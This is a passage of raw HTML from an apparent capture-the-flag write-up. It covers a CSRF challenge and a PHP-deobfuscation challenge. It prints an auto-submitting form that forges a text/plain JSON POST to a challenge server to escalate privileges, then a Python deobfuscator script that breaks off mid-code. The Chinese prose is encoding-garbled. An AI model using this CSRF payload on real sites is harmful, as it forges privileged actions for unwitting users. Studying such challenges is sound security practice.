</span></span></code></pre></td></tr></table></div></div><p>è®¿é—®å°±æ˜¯ flag äº†</p><h2 id=fxxkcors>fxxkcors</h2><p>ç®€å•çš„ CSRF ï¼ŒæœåŠ¡æ²¡æœ‰éªŒè¯ JSON çš„ content-type ï¼Œæ‰€ä»¥ç›´æ¥æ”¾ä¸€ä¸ªè¡¨å•ç»™ admin è®¿é—®å°±å¯ä»¥è®©æˆ‘ä»¬æå‡æƒé™äº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-HTML data-lang=HTML><span class=line><span class=cl><span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>form</span> <span class=na>id</span><span class=o>=</span><span class=s>a</span> <span class=na>action</span><span class=o>=</span><span class=s>&#34;http://124.71.205.122:10002/changeapi.php&#34;</span> <span class=na>method</span><span class=o>=</span><span class=s>&#34;POST&#34;</span> <span class=na>enctype</span><span class=o>=</span><span class=s>&#34;text/plain&#34;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=p>&lt;</span><span class=nt>input</span> <span class=na>name</span><span class=o>=</span><span class=s>&#39;{&#34;username&#34;:&#34;fweewfwef&#34;, &#34;abc&#34;:&#34;&#39;</span> <span class=na>value</span><span class=o>=</span><span class=s>&#39;123&#34;}&#39;</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>form</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl>      <span class=nx>a</span><span class=p>.</span><span class=nx>submit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
</span></span><span class=line><span class=cl><span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=rubbish-maker>rubbish maker</h2><p>This challange was more rev than web.</p><h3 id=statement>Statement</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-JavaScript data-lang=JavaScript><span class=line><span class=cl><span class=nx>I</span> <span class=nx>have</span> <span class=nx>made</span> <span class=nx>some</span> <span class=nx>rubbish</span> <span class=k>for</span> <span class=nx>you</span><span class=p>,</span><span class=nx>i</span> <span class=nx>guess</span> <span class=nx>you</span> <span class=nx>won</span><span class=err>â€™</span><span class=nx>t</span> <span class=nx>enjoy</span> <span class=nx>it</span>  
</span></span><span class=line><span class=cl><span class=nx>http</span><span class=o>:</span><span class=c1>//123.60.67.19/  
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nx>container</span> <span class=nx>restart</span> <span class=k>for</span> <span class=nx>every</span> <span class=mi>2</span> <span class=nx>hours</span>
</span></span></code></pre></td></tr></table></div></div><p>Going to the link gives us:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>./code/8ca5c8ec00628042f7028492fdf2986f
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>your code at ./code/8ca5c8ec00628042f7028492fdf2986f/index.php
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>you can view it at ./code/8ca5c8ec00628042f7028492fdf2986f/index.txt
</span></span></code></pre></td></tr></table></div></div><p>And downloading <code>index.txt</code> gives us heavily obfuscated php code. This file also changes every two hours so we must write general automated deobfuscator since doing it manually and case by case will be useless after two hours. This writeup is for specific version I got but should be general enough.
Hereâ€™s my <a href="https://drive.google.com/file/d/1DCKPqSWfD7UpO99rGGY5IzKjmUTYqxrc/view?usp=sharing">index.php</a></p><h3 id=deobfuscation>Deobfuscation</h3><ul><li>Observe that there is a big function at the start which is called many times.</li><li>We see that the argument that this function takes is xorâ€™d to something constant so first we replace all <code>f({x})</code> with <code>f({x} xor {that constant})</code> and also replace the xorâ€™s in the function itself. This will get rid of most bad bytes. We must also be careful to do everything as bytes and not uf8 strings.</li><li>Then we observe that we can try to call the function with these values and see if result is always same. As it turns out function is only dependent on itâ€™s argument. So we generate php code to call each<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>f({x})
</span></span></code></pre></td></tr></table></div></div>and replace the calls with this value everywhere with the resulting value.<ul><li>sometimes the value that this function returns is a closure and we use closure dumping code from stackoverflow for that</li></ul></li><li>At this point we can remove the function in the beggining and code would still work</li><li>Thereâ€™s a lot of encodings(rot13, base64, strrevâ€¦) so we try to get them replaced as well</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>,</span> <span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># print(fb)</span>
</span></span><span class=line><span class=cl><span class=n>fn_name</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;NtjNSJyp&#39;</span>
</span></span><span class=line><span class=cl><span class=n>i</span><span class=o>=-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;NaDKRCAe&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>woah</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>escb</span><span class=p>(</span><span class=n>b</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\\\</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>b</span> <span class=o>=</span> <span class=n>b</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#39;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>b</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sv</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>i</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=n>fn_name</span><span class=p>,</span> <span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> 
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span><span class=o>==-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>i</span><span class=o>==</span><span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>jl</span> <span class=o>=</span> <span class=n>i</span><span class=o>+</span><span class=nb>len</span><span class=p>(</span><span class=n>fn_name</span><span class=p>)</span><span class=o>+</span><span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>jr</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#39;)&#34;</span><span class=p>,</span> <span class=n>jl</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>jr</span><span class=o>-</span><span class=n>jl</span><span class=o>&lt;</span><span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>jr</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#39;)&#34;</span><span class=p>,</span> <span class=n>jr</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># jr-=1</span>
</span></span><span class=line><span class=cl>    <span class=c1># while fb[jr-1] == ord(&#39;\\&#39;) and jr-jl:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     jr = fb.find(b&#34;&#39;&#34;, jr+1)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(&#39;aaaaa:&#39;, chr(fb[jr-1]))</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(i)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=p>(</span><span class=n>fb</span><span class=p>[</span><span class=n>jl</span><span class=p>:</span><span class=n>jr</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\\\</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\\</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\\</span><span class=s2>&#39;&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>==</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=p>(</span><span class=nb>bytes</span><span class=p>(</span><span class=n>a</span> <span class=o>^</span> <span class=n>b</span> <span class=k>for</span> <span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>)</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>    <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=p>[:</span><span class=n>jl</span><span class=p>]</span> <span class=o>+</span> <span class=n>r</span> <span class=o>+</span> <span class=n>fb</span><span class=p>[</span><span class=n>jr</span><span class=p>:]</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sv</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>r</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># print(eval(fb[jl:jr]))</span>
</span></span><span class=line><span class=cl><span class=c1># print(fb)</span>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;$DenKBzmP ^ $rbcwAIhe&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;$DenKBzmP&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=n>fn_name</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;f&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>dumper</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>function closure_dump(Closure $c) {
</span></span></span><span class=line><span class=cl><span class=s1>    $str = &#39;function (&#39;;
</span></span></span><span class=line><span class=cl><span class=s1>    $r = new ReflectionFunction($c);
</span></span></span><span class=line><span class=cl><span class=s1>    $params = array();
</span></span></span><span class=line><span class=cl><span class=s1>    foreach($r-&gt;getParameters() as $p) {
</span></span></span><span class=line><span class=cl><span class=s1>        $s = &#39;&#39;;
</span></span></span><span class=line><span class=cl><span class=s1>        if($p-&gt;isArray()) {
</span></span></span><span class=line><span class=cl><span class=s1>            $s .= &#39;array &#39;;
</span></span></span><span class=line><span class=cl><span class=s1>        } else if($p-&gt;getClass()) {
</span></span></span><span class=line><span class=cl><span class=s1>            $s .= $p-&gt;getClass()-&gt;name . &#39; &#39;;
</span></span></span><span class=line><span class=cl><span class=s1>        }
</span></span></span><span class=line><span class=cl><span class=s1>        if($p-&gt;isPassedByReference()){
</span></span></span><span class=line><span class=cl><span class=s1>            $s .= &#39;&amp;&#39;;
</span></span></span><span class=line><span class=cl><span class=s1>        }
</span></span></span><span class=line><span class=cl><span class=s1>        $s .= &#39;$&#39; . $p-&gt;name;
</span></span></span><span class=line><span class=cl><span class=s1>        if($p-&gt;isOptional()) {
</span></span></span><span class=line><span class=cl><span class=s1>            $s .= &#39; = &#39; . var_export($p-&gt;getDefaultValue(), TRUE);
</span></span></span><span class=line><span class=cl><span class=s1>        }
</span></span></span><span class=line><span class=cl><span class=s1>        $params []= $s;
</span></span></span><span class=line><span class=cl><span class=s1>    }
</span></span></span><span class=line><span class=cl><span class=s1>    $str .= implode(&#39;, &#39;, $params);
</span></span></span><span class=line><span class=cl><span class=s1>    $str .= &#39;){&#39; . PHP_EOL;
</span></span></span><span class=line><span class=cl><span class=s1>    $lines = file($r-&gt;getFileName());
</span></span></span><span class=line><span class=cl><span class=s1>    for($l = $r-&gt;getStartLine(); $l &lt; $r-&gt;getEndLine(); $l++) {
</span></span></span><span class=line><span class=cl><span class=s1>        $str .= $lines[$l];
</span></span></span><span class=line><span class=cl><span class=s1>    }
</span></span></span><span class=line><span class=cl><span class=s1>    return $str;
</span></span></span><span class=line><span class=cl><span class=s1>}
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span><span class=o>.</span><span class=n>encode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>fb</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>fb</span><span class=p>[:</span><span class=mi>1</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>dumper</span><span class=p>]</span> <span class=o>+</span> <span class=n>fb</span><span class=p>[</span><span class=mi>1</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=n>fb</span><span class=p>[:(</span><span class=n>fb</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;PeuuUVqY&#39;</span><span class=p>))]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=n>sv</span> <span class=o>=</span> <span class=nb>sorted</span><span class=p>(</span><span class=nb>list</span><span class=p>(</span><span class=n>sv</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>C_F</span> <span class=o>=</span> <span class=mi>0</span> 
</span></span><span class=line><span class=cl><span class=n>closures</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>sv</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;echo f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;);echo &#39;ABABA&#39;;&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;echo f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;);echo &#39;ABABA&#39;;&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;echo f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;);echo &#39;ABABA&#39;;&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    <span class=n>d</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;res.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;./res.php&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>out</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>outlines</span> <span class=o>=</span> <span class=p>[</span><span class=n>ln</span> <span class=k>for</span> <span class=n>ln</span> <span class=ow>in</span> <span class=n>out</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;ABABA&#39;</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>outlines</span> <span class=o>=</span> <span class=n>outlines</span><span class=p>[:</span><span class=mi>3</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>outlines</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=nb>set</span><span class=p>(</span><span class=n>outlines</span><span class=p>))</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>outlines</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span>
</span></span><span class=line><span class=cl>            <span class=n>fb</span> <span class=o>=</span> <span class=n>fb</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;)&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\&#39;</span><span class=s2>&#34;</span><span class=o>+</span><span class=n>outlines</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\&#39;</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>assert</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;DUDU IS HERE&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>l</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()[:</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>l</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;echo closure_dump(f(&#39;</span><span class=si>{</span><span class=n>v</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span><span class=si>}</span><span class=s2>&#39;));&#34;</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;res.php&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;php&#39;</span><span class=p>,</span> <span class=s1>&#39;./res.php&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>out</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>closure_name</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;fclosure_</span><span class=si>{</span><span class=n>C_F</span><span class=si>}</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>closure_code</span> <span class=o>=</span> <span class=n>out</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; == &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>closure_name</span> <span class=o>=</span> <span class=s1>&#39;f_eq&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39; !== &#39;</span> <span class=ow>in</span> <span class=n>closure_code</span><span class=p>:</span>
